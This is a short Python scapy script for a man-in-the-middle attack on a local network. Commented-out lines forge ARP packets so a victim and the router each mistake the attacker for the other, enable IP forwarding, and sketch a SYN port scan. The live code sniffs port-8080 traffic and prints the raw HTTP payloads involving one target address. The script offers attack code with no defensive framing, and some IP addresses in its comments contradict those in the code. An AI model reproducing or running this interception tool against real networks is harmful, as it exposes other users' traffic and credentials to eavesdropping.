#!/usr/bin/python
from scapy.all import *


# while True:
# packet = ARP(op=1, pdst="192.168.200.63", hwaddr="e8:1c:ba:32:48:fb", psrc="192.168.200.1")
# send(packet) #Packet telling the Victim (with ip address 192.168.111.157) that the hacker is the Router.

# packet = ARP(op=1, pdst="192.168.200.1", psrc="192.168.200.63")
# send(packet) #Packet telling the Router (with ip address 192.168.111.2) that the hacker is the Victim.

# ip=IP(src="192.168.200.1",dst='192.168.200.63')/Ether()/TCP(flags='S', dport=(1, 1024))
# echo 1 > /proc/sys/net/ipv4/ip_forward


import base64
import re

def http_header(packet):
        http_packet=str(packet)
        if re.search("199\.34\.21\.253",repr(packet)):
            print("\n\n\n\n---------------------------------------------------------------------------------------------------")
            print(repr(packet))
            # print(packet.sprintf("{Raw:%Raw.load%}\n"))
            return GET_print(packet)
        else:
            print(repr(packet))        
        

def GET_print(packet1):
    ret = "***************************************GET PACKET****************************************************\n"
    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    ret += "\n"
    return ret

# sniff(iface='wlp2s0', prn=http_header, filter="tcp and (port 80 or port 8080)")

sniff(iface='enp2s0', prn=http_header, filter="tcp port 8080")